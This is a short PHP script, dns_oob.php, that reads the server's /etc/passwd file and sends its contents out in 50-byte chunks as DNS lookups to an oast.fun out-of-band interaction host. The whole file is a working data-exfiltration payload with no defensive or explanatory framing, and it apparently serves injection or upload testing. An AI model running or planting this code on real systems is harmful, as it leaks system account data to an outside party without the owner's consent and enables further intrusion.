<?php
// dns_oob.php
$data = str_replace("\n", '', file_get_contents('/etc/passwd'));
foreach (str_split($data, 50) as $chunk) {
  // split into ≤63-byte labels so DNS will accept it
  gethostbyname($chunk . '.yggiymzokjpzfkuyzgfkwy9vq87b4ok2r.oast.fun');
}
